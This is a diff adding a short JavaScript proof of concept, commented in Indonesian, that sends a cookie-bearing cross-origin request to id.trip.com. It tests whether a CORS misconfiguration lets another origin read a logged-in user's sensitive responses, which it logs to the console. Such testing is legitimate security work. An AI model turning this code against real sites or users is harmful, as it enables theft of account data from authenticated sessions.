@@ -1,0 +1,24 @@
+// 1. Inisialisasi objek XMLHttpRequest
+var xhr = new XMLHttpRequest();
+
+// 2. Konfigurasi Method dan URL target
+var url = "https://id.trip.com";
+xhr.open("GET", url, true);
+
+// 3. AKTIFKAN CREDENTIALS (Mengirimkan Cookie antar-domain)
+xhr.withCredentials = true;
+
+// 4. Handle response dari server
+xhr.onreadystatechange = function () {
+    if (xhr.readyState === XMLHttpRequest.DONE) {
+        if (xhr.status === 200) {
+            // Jika sukses dan CORS mengizinkan, data sensitif akan muncul di sini
+            console.log("Data berhasil diambil:", xhr.responseText);
+        } else {
+            console.error("Gagal mengambil data. Status:", xhr.status);
+        }
+    }
+};
+
+// 5. Kirim request
+xhr.send();
